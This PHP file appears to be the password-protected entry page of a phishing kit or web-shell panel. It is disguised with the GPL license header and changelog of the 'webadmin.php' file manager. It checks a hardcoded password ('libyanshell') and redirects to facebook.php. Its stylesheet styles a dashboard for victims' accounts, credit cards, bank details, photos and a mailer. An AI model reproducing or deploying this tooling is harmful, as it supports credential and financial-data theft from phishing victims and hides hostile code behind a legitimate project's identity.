<?php
session_start();
$myuser = "libyanshell";
 /* This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 * -------------------------------------------------------------------------
 * While using this script, do NOT navigate with your browser's back and
 * forward buttons! Always open files in a new browser tab!
 * -------------------------------------------------------------------------
 *
 * This is Version 0.9, revision 12
 * =========================================================================
 *
 * Changes of revision 12
 * [bhb at o2 dot pl]
 *    added Polish translation
 * [daniel dot wacker at web dot de]
 *    switched to UTF-8
 *    fixed undefined variable
 *
 * Changes of revision 11
 * [daniel dot wacker at web dot de]
 *    fixed handling if folder isn't readable
 *
 * Changes of revision 10
 * [alex dash smirnov at web.de]
 *    added Russian translation
 * [daniel dot wacker at web dot de]
 *    added </td> to achieve valid XHTML (thanks to Marc Magos)
 *    improved delete function
 * [ava at asl dot se]
 *    new list order: folders first
 *
 * Changes of revision 9
 * [daniel dot wacker at web dot de]
 *    added workaround for directory listing, if lstat() is disabled
 *    fixed permisson of uploaded files (thanks to Stephan Duffner)
 *
 * Changes of revision 8
 * [okankan at stud dot sdu dot edu dot tr]
 *    added Turkish translation
 * [j at kub dot cz]
 *    added Czech translation
 * [daniel dot wacker at web dot de]
 *    improved charset handling
 *
 * Changes of revision 7
 * [szuniga at vtr dot net]
 *    added Spanish translation
 * [lars at soelgaard dot net]
 *    added Danish translation
 * [daniel dot wacker at web dot de]
 *    improved rename dialog
 *
 * Changes of revision 6
 * [nederkoorn at tiscali dot nl]
 *    added Dutch translation
 *
 * Changes of revision 5
 * [daniel dot wacker at web dot de]
 *    added language auto select
 *    fixed symlinks in directory listing
 *    removed word-wrap in edit textarea
 *
 * Changes of revision 4
 * [daloan at guideo dot fr]
 *    added French translation
 * [anders at wiik dot cc]
 *    added Swedish translation
 *
 * Changes of revision 3
 * [nzunta at gabriele dash erba dot it]
 *    improved Italian translation
 *
 * Changes of revision 2
 * [daniel dot wacker at web dot de]
 *    got images work in some old browsers
 *    fixed creation of directories
 *    fixed files deletion
 *    improved path handling
 *    added missing word 'not_created'
 * [till at tuxen dot de]
 *    improved human readability of file sizes
 * [nzunta at gabriele dash erba dot it]
 *    added Italian translation
 *
 * Changes of revision 1
 * [daniel dot wacker at web dot de]
 *    webadmin.php completely rewritten:
 *    - clean XHTML/CSS output
 *    - several files selectable
 *    - support for windows servers
 *    - no more treeview, because
 *      - webadmin.php is a >simple< file manager
 *      - performance problems (too much additional code)
 *      - I don't like: frames, java-script, to reload after every treeview-click
 *    - execution of shell scripts
 *    - introduced revision numbers
 *
/* ------------------------------------------------------------------------- */

if (isset($_POST['li7wak'])) {
$user_get = $_POST['user'];
if ($user_get == $myuser ) {
    header ("Location: facebook.php");
    $_SESSION['li7wak'] = $user.$psd;
    exit;
}
}
?>
<html>
<head>
<title>Send SMS By MNx0_DCH_DVS</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf8" />
<link rel="shortcut icon" href="https://i.imgur.com/XMoqw0f.png" type="image/png" /></head>
<link href='https://fonts.googleapis.com/css?family=Exo:400,800' rel='stylesheet' type='text/css'>
<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script> 
<Style>
<script src="https://use.fontawesome.com/10d518fb9b.js"></script>
<style type="text/css">
@import url(https://fonts.googleapis.com/css?family=Roboto:300);

.login-page {
  width: 360px;
  padding: 8% 0 0;
  margin: auto;
}
.form {
  position: relative;
  z-index: 1;
  background: #FFFFFF;
  max-width: 360px;
  margin: 0 auto 100px;
  padding: 45px;
  text-align: center;
  box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
}
.form input {
  font-family: "Roboto", sans-serif;
  outline: 0;
  background: #f2f2f2;
  width: 100%;
  border: 0;
  margin: 0 0 15px;
  padding: 15px;
  box-sizing: border-box;
  font-size: 14px;
}
.form button {
  font-family: "Roboto", sans-serif;
  text-transform: uppercase;
  outline: 0;
  background: #4CAF50;
  width: 100%;
  border: 0;
  padding: 15px;
  color: #FFFFFF;
  font-size: 14px;
  -webkit-transition: all 0.3 ease;
  transition: all 0.3 ease;
  cursor: pointer;
}

html,body,div,span,h1,h2,h3,p,a,img,ol,ul,li,form{margin:0;padding:0;border:0;outline:0;vertical-align:baseline;background:transparent}input,textarea{font-family:Helvetica;font-size:14px;font-weight:100;margin:0;padding:0}body{font-size:14px;font-family:helvetica;font-style:normal;font-variant:normal;font-weight:100;margin:0;background:#f3f3f3;color:#000}ol,ul{list-style:none}a{cursor:pointer;text-decoration:none;color:#000}a:focus,a:hover{text-decoration:underline}:focus{outline:0}.clearfix:after{content:" ";display:block;clear:both;visibility:hidden;line-height:0;height:0}.clearfix{display:inline-block}html .clearfix{display:block}img{vertical-align:bottom}body{position:relative;min-width:480px}body{background:url(http://images3.miakhalifa.com/warning/background.jpg) no-repeat left center fixed;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover}.container{position:absolute;right:184px;top:180px;width:402px;height:306px}.tophed{font-size:24px;font-weight:normal;color:#fff;text-align:center}.slogn{padding:11px 12px 0}.slTxt{display:block;color:#fff;text-align:center}.textarea{margin:16px 0 0 0;overflow:auto;width:400px;height:115px;border:#8aa6bf solid 1px;background:#fff;font-size:13px}.age{margin:17px 0 9px;text-align:center;color:#fff;font-size:17px}.enter{font-size:49px;color:#fff;font-weight:bold;text-align:center;text-transform:uppercase;display:block;text-decoration:underline}.enter:hover{color:#d2d2d2}@media(max-width:680px){.container{margin-left:-201px;left:50%}}@media screen and (max-height:600px){.container{top:100px}}
body{background-color:#000}.absFooter{font-family:arial;font-size:17px;font-style:normal;font-variant:normal;background:none repeat scroll 0 0 rgba(0,0,0,0.2);position:fixed;width:100%;bottom:0;color:#fff;font-weight:bold;left:0;min-height:48px;text-align:center;text-shadow:1px 1px 0 rgba(0,0,0,0.1),-1px -1px 0 rgba(0,0,0,0.1),1px -1px 0 rgba(0,0,0,0.1),-1px 1px 0 rgba(0,0,0,0.1),1px 1px 0 rgba(0,0,0,0.1);width:100%}.absFt-in{padding:9px 0 7px}.absFooter a{color:#fff}.asacpPic{padding-left:3px}.absFooter img{vertical-align:middle}
</style>
<style type='text/css'>
@font-face { font-family: 'xAllerDisplay'; src: url('font/AllerDisplay.eot'); src: url('font/AllerDisplay.eot?#iefix') format('embedded-opentype'), url('font/AllerDisplay.woff') format('woff'), url('font/AllerDisplay.ttf') format('truetype'), url('font/AllerDisplay.svg#AllerDisplay') format('svg'); font-style: normal; font-weight: normal; text-rendering: optimizeLegibility; } ::selection{ background-color: transparent; color: #E15374; } /* #E15374 */ ::-moz-selection{ background-color: transparent; color: #E15374; } /* #E15374 */ /* ::-webkit-scrollbar { width: 10px; height: 10px;} ::-webkit-scrollbar-track-piece { background-color: #7B7B7B;} ::-webkit-scrollbar-thumb:vertical { background-color: #272727; border-left: 1px solid #3d3d3d; border-right: 1px solid #3d3d3d;} ::-webkit-scrollbar-thumb:vertical:hover { background-color: #272727;} ::-webkit-scrollbar-thumb:horizontal { background-color: #272727; border-top: 1px solid #3d3d3d; border-bottom: 1px solid #3d3d3d;} ::-webkit-scrollbar-thumb:horizontal:hover { background-color: #272727;} */ *{ margin: 0px; padding: 0px; }
body{ background-color: #0d0d0d; font-family: "xAllerDisplay"; } #container{ width: 90%; max-width: 1260px; min-width: 1200px; height: auto; min-height: 500px; margin: 20px auto; } #header{ width: 100%; height: 100px; position: relative; } #logo{ background-image: url(img/logo.png); background-repeat: no-repeat; background-position: 50% 50%; position: relative; /* background-size: 326px 47px; width: 326px; height: 47px; margin: 30px 0 0 0; */ background-size: 333px 56px; width: 333px; height: 56px; margin: 25px 0 0 0; float: left; opacity: 1; cursor: pointer; /* transition: opacity .5s; */ } /* #logo:hover{ opacity: 0.8; } */ #menu{ position: relative; float: right; } .menu_item{ position: relative; float: right; background-color: #FFFFFF; border-radius: 10px; height: 100px; padding: 0 10px; margin-left: 10px; background-position: 50% 50%; background-repeat: no-repeat; cursor: pointer; transition: background .5s; } .menu_item:hover{ background-color: #333; } 
.x_account{ background-image: url(icon/accounts.png);  width: 122px; } 
.x_settings{ background-image: url(icon/settings.png); width: 102px; }
.x_support{ background-image: url(icon/support.png); width: 111px; } 
.x_search{ background-image: url(icon/search.png);  width: 93px; } 
#content{ margin-top: 10px; background-color: #171717; border-radius: 10px; height: auto; width: 100%; position: relative; box-sizing: border-box; padding: 20px; } #title_1{ width: 100%; font-size: 54px; color: rgb(144, 144, 144); margin-bottom: 20px; } .line{ width: 100%; background-color: #121212; position: relative; margin-bottom: 10px; border-radius: 10px; padding: 5px; font-size: 20px; color: rgb(144, 144, 144); box-sizing: border-box; transition: background .2s,color .2s; } .line:hover{ background-color: rgb(144, 144, 144); color: #121212; } .transparent{ /* width: 100%; */ background-color: #121212; position: relative; margin-bottom: 10px; border-radius: 10px; padding: 5px; font-size: 20px; color: rgb(144, 144, 144); box-sizing: border-box;	margin-bottom: 0px; background: transparent; height: auto; } .line table,.transparent table{ width: 100%; table-layout: fixed; } .xx_pagination{ max-width: 1260px; min-width: 1200px; } .x_1{ width: 80px; } .x_2{ width: 80px; } .x_xx{ width: 30px; } .x_3{ width: 30px; } .x_4{ width: 50px; } .x_5{ width: 20px; } .x_6{ width: 40px; } .line table .x_2{ width: 80px; color: transparent; text-shadow: 0 0 5px rgba(144,144,144,0.7); transition: color .5s; } .line:hover table .x_2{ color: #121212; } .y_1{ background-image: url(img/acc__0.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 30px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_1_1{ background-image: url(img/acc__1.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 30px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_2{ background-image: url(img/cc__0.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 28px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_2_1{ background-image: url(img/cc__1.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 28px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_2_2{ background-image: url(img/cc__2.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 28px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_3{ background-image: url(img/bnk__0.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 40px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_4{ background-image: url(img/clipboard.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 15px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .y_1.no{opacity: 0.2;cursor: auto;} .y_2.no{opacity: 0.2;cursor: auto;} .y_3.no{opacity: 0.2;cursor: auto;} .line table tr td{ overflow: hidden; text-overflow: ellipsis; } .z_1{ background-image: url(img/delete.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 20px; height: 20px; float: left; margin: 0 10px 0 0; position: relative; cursor: pointer; } .pagination{ background-color: #121212; color: rgb(144, 144, 144); transition: background .2s,color .2s; padding: 5px 10px; border-radius: 10px; margin: 0 5px; display: inline; cursor: pointer; } .pagination:hover,.pg_active{ background-color: rgb(144, 144, 144); color: #121212; } #table_settings,.account_details,.creditcard_details,.bank_details,#mailer,#search_pg{ font-family: "xAllerDisplay"; border-top: 1px dashed #565656; width: 100%; position: relative; overflow-wrap: break-word; /* display: none; */ background-color: #191919; border-radius: 10px; color: rgb(144, 144, 144); display: none; } .hidden{ display: none; } #table_settings td:nth-child(odd),.account_details td:nth-child(odd),.creditcard_details td:nth-child(odd),.bank_details td:nth-child(odd),#mailer td:nth-child(odd),#search_pg td:nth-child(odd){ text-align: right; padding-right: 10px; width: 30%; } #table_settings td:nth-child(even),.account_details td:nth-child(even),.creditcard_details td:nth-child(even),.bank_details td:nth-child(even),#mailer td:nth-child(even),#search_pg td:nth-child(even){ padding-left: 10px; text-align: left; } #table_settings tr:nth-child(odd),.account_details tr:nth-child(odd),.creditcard_details tr:nth-child(odd),.bank_details tr:nth-child(odd),#mailer tr:nth-child(odd),#search_pg tr:nth-child(odd){ background-color: #202020; } #table_settings,#mailer,#search_pg{ width: 100%; display: block; } #table_settings table,#mailer table,#search_pg table{ width: 100%; } #table_settings input[type=text],#table_settings textarea,#table_settings select, #mailer input[type=text],#mailer textarea,#mailer select, #search_pg input[type=text],#search_pg textarea,#search_pg select { font-family: "xAllerDisplay"; /* line-height: 20px; */ font-size-adjust: auto; background-color: #111; border: 0px; width: 450px; min-width: 450px; max-width: 450px; color: #aaa; font-size: 20px; box-sizing: border-box; border: 1px dashed #333; margin-bottom: 2px; border-radius: 5px; } #table_settings textarea, #mailer textarea,#search_pg textarea{ min-height: 100px; height: 100px; } #table_settings button, #mailer button,#search_pg button{ font-family: "xAllerDisplay"; background-color: #aaa; border: 0px; border: 1px dashed #333; border-radius: 5px; padding: 5px 50px; color: #111; font-size: 25px; cursor: pointer; margin: 10px 0; } .victimephoto{ border-radius: 10px; border: 1px dashed #555; opacity: 0.7; transition: opacity .5s, width 2s, height 2s; width: 49px; height: 50px; cursor: pointer; } .victimephoto:hover{ opacity: 7; width: 198px; height: 200px; } .identities{ border-radius: 10px; border: 1px dashed #555; opacity: 7; width: 10%; height: auto; cursor: pointer; } #dashboard_full_width{ width: 100%; height: auto; min-height: 300px; color: rgb(130, 130, 130); /* background-color: #911; */ } #dashboard_left{ width: 49%; height: auto; min-height: 300px; float: left; /* background-color: #599; */ } #dashboard_right{ width: 49%; height: 300px; float: right; /* background-color: #959; */ } #title_1 table{ width: 100%; } #title_1 table tr td{ font-size: 20px; text-align: center; } #title_1 table tr td:nth-child(even){ border-right: 1px dashed rgba(200,200,200,0.4); border-left: 1px dashed rgba(200,200,200,0.4); } #title_1 table tr#numbers td{ font-size: 30px; } .canvasjs-chart-container{ /* width: 100%; height: 400px; */ } .canvasjs-chart-canvas{ background-color: rgba(100,100,100,0.5); border-radius: 10px; /* width: 100%; height: 400px; */ } #banner{ margin-top: 10px; background-color: #171717; border-radius: 10px; height: auto; width: 100%; position: relative; box-sizing: border-box; padding: 10px 10px 5px 10px; text-align: right; } #banner_date{ position: relative; text-align: left; float: left; font-size: 20px; color: rgb(144, 144, 144); margin: 5px; } #footer{ margin-top: 10px; background-color: #171717; border-radius: 10px; height: auto; width: 100%; position: relative; box-sizing: border-box; padding: 20px; text-align: left; color: rgb(144, 144, 144); min-height: 70px; background-image: url(img/copyrigh.png); background-position: 50% 50%; background-repeat: no-repeat; background-size: 413px 61px; } .cr_1{ background-image: url(img/good.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 18px; height: 24px; position: relative; cursor: pointer; float: left; margin: 0 10px 0 0; opacity: 0.25; } .cr_2{ background-image: url(img/bad.png); background-size: 100% 100%; background-position: 50% 50%; background-repeat: no-repeat; width: 18px; height: 24px; position: relative; cursor: pointer; float: left; margin: 0 10px 0 0; opacity: 0.25; } .cr_active{ opacity: 1; } #statistic{ float: right; color: #fff; margin-top: -50px; color: rgb(144, 144, 144); background-color: #121212; margin-bottom: 5px; border-radius: 10px; padding: 7px 20px 4px 0px; } .statistics_x{ float: right; font-size: 20px; } .statt_8{ width: 40px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/bnk__0.png'); background-size: 40px 20px; background-position: 50% 50%; } .statt_7{ width: 18px; height: 24px; position: relative; margin-left: 20px; background-image: url('img/good.png'); background-size: 18px 24px; background-position: 50% 50%; } .statt_6{ width: 18px; height: 24px; position: relative; margin-left: 20px; background-image: url('img/bad.png'); background-size: 18px 24px; background-position: 50% 50%; } .statt_5{ width: 28px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/cc__2.png'); background-size: 28px 20px; background-position: 50% 50%; } .statt_4{ width: 28px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/cc__1.png'); background-size: 28px 20px; background-position: 50% 50%; } .statt_3{ width: 28px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/cc__0.png'); background-size: 28px 20px; background-position: 50% 50%; } .statt_2{ width: 28px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/acc__0.png'); background-size: 28px 20px; background-position: 50% 50%; } .statt_1{ width: 28px; height: 20px; position: relative; margin-left: 20px; background-image: url('img/acc__1.png'); background-size: 28px 20px; background-position: 50% 50%; }
</style>  
<script type="text/javascript"></script>    
</head>
<body>
<center>
<img src="https://www.iconfinder.com/data/icons/ios7-active-basic/512/user_access-512.png" style="width:284px;height:228px;">
<br>
<br>
<br>
<br>
<br>
<div class="login-page">
  <div class="form" style="margin-top:-60px;display:block">
    <form class="login-form" action="" required="" method="POST">
      <input type="password" name="user" required="" placeholder="Password"/>
      <button type="submit" name="li7wak">login</button>
      
    </form>
  </div>
</div></center>
</body>
</html>